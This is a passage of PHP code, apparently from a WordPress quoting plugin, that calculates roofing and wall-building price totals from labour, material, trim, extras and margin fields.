				$current_total = $current_total;
		}

		
	  $roof_total = $proposed_total + $trim_total;
		$roof_sub = $roof_total * $shape_total/100;
		
		$roofing_total =  $current_total + $extras_total + $roof_total + $roof_sub;
		$total = $total + $roofing_total;

	}

	// V2 formulas for Roofing template
	if(get_the_title($t) == 'Build Walls') {

		$all_scope_data = get_field('quote_fields',$t);

		$width = $data['area_length'];
		$height = $data['area_height'];

		$area = $width * $height;

		foreach($all_scope_data as $d) {
				if($d['slug'] == 'type') {
						$type_title = $d['title'];
						$type_prices = $d['type_of_price'];
						$type_data = $d['fields'];
				}
				if($d['slug'] == 'finish') {
						$finish_title = $d['title'];
						$finish_prices = $d['type_of_price'];
						$finish_data = $d['fields'];
				}
			 if($d['slug'] == 'trim') {
						$trim_title = $d['title'];
						$trim_prices = $d['type_of_price'];
						$trim_data = $d['fields'];
				}
				if($d['slug'] == 'extras') {
						$extras_title = $d['title'];
						$extras_prices = $d['type_of_price'];
						$extras_data = $d['fields'];
				}
		}

		$type = $data['type'];
		$type_total = 0;
		foreach($type_data as $temp) {
				if( in_array($temp['title'],$type)  || $temp['title'] == $type ) {

						if($type_prices == 'labour') {
								$labour_price_total = $temp['labour'];
								$labour_price_total_value = 0;
								$material_price_total = $temp['material'];
								$material_price_total_value = 0;
								foreach($labour_price_total as $l) {
										$labour_price_total_value = $labour_price_total_value + $l['price'];
								}
								foreach($material_price_total as $m) {
										$material_price_total_value = $material_price_total_value + $m['price'];
								}
								$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
								// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
								$selectionPrice = 0;
								$selectionPrice = go_calculate_selection($selectionsData,$type_title,$temp['title']);
								$labour_and_material_total = $labour_and_material_total + $selectionPrice;
								// *** END ***

								$type_total = $type_total +  ( $labour_and_material_total * $area );
						}
						elseif($type_prices == 'range') {
								$range_price_total = $temp['range_price'];
								$type_total = $type_total + ( $range_price_total * $area );
						}

				}
		}

		
	  $finish = $data['finish'];
		$finish_total = 0;
		foreach($finish_data as $temp) {
				if( in_array($temp['title'],$finish)  || $temp['title'] == $finish ) {

						if($finish_prices == 'labour') {
								$labour_price_total = $temp['labour'];
								$labour_price_total_value = 0;
								$material_price_total = $temp['material'];
								$material_price_total_value = 0;
								foreach($labour_price_total as $l) {
										$labour_price_total_value = $labour_price_total_value + $l['price'];
								}
								foreach($material_price_total as $m) {
										$material_price_total_value = $material_price_total_value + $m['price'];
								}
								$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
								// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
								$selectionPrice = 0;
								$selectionPrice = go_calculate_selection($selectionsData,$finish_title,$temp['title']);
								$labour_and_material_total = $labour_and_material_total + $selectionPrice;
								// *** END ***

								$finish_total = $finish_total +  ( $labour_and_material_total * $area );
						}
						elseif($finish_prices == 'range') {
								$range_price_total = $temp['range_price'];
								$finish_total = $finish_total + ( $range_price_total * $area );
						}

				}
		}

		$trim = $data['trim'];
		$trim_total = 0;
		foreach($trim_data as $temp) {
				if( in_array($temp['title'],$trim)  || $temp['title'] == $trim ) {

					// let's count QNT of each extra field
						$field_title = $temp['title'];
						$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
						$count_field_title = strtolower($count_field_title);
						$extra_count = $data['' . $count_field_title . ''];
						if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
							   $extra_count = 1;
						}

						if($trim_prices == 'labour') {
								$labour_price_total = $temp['labour'];
								$labour_price_total_value = 0;
								$material_price_total = $temp['material'];
								$material_price_total_value = 0;
								foreach($labour_price_total as $l) {
										$labour_price_total_value = $labour_price_total_value + $l['price'];
								}
								foreach($material_price_total as $m) {
										$material_price_total_value = $material_price_total_value + $m['price'];
								}
								$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
								// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
								$selectionPrice = 0;
								$selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
								$labour_and_material_total = $labour_and_material_total + $selectionPrice;
								// *** END ***

								$trim_total = $trim_total +  ( $labour_and_material_total * $extra_count);
						}
						elseif($trim_prices == 'range') {
								$range_price_total = $temp['range_price'];
								$trim_total = $trim_total + ( $range_price_total * $extra_count);
						}

				}
		}
		
		$extras = $data['extras'];
		$extras_total = 0;
		foreach($extras_data as $temp) {
				if( in_array($temp['title'],$extras) || $temp['title'] == $extras ) {

						// let's count QNT of each extra field
						$field_title = $temp['title'];
						$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
						$count_field_title = strtolower($count_field_title);
						$extra_count = $data['' . $count_field_title . ''];
						if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
							   $extra_count = 1;
						}

						if($extras_prices == 'labour') {
								$labour_price_total = $temp['labour'];
								$labour_price_total_value = 0;
								$material_price_total = $temp['material'];
								$material_price_total_value = 0;
								foreach($labour_price_total as $l) {
										$labour_price_total_value = $labour_price_total_value + $l['price'];
								}
								foreach($material_price_total as $m) {
										$material_price_total_value = $material_price_total_value + $m['price'];
								}
								$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
								// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
								$selectionPrice = 0;
								$selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
								$labour_and_material_total = $labour_and_material_total + $selectionPrice;
								// *** END ***

								$extras_total = $extras_total + ( $labour_and_material_total * $extra_count );
						}
						elseif($extras_prices == 'range') {
								$range_price_total = $temp['range_price'];
								$extras_total = $extras_total + ( $range_price_total * $extra_count);
						}

				}
		}


		
	  $walls_total = $type_total + $finish_total + $trim_total + $extras_total;
		$total = $total + $walls_total;

	}

	
	$margin = $data['scopeMargin'];
	if(!$margin) {
		$margin = 0;
	}
	$marginTotal = $total * $margin / 100;
	$total = $total + $marginTotal;
	$total = number_format($total, 2, '.', '');
	$object->string = $fencing_total;
	$object->total = $total;

	return $object;
}

?>
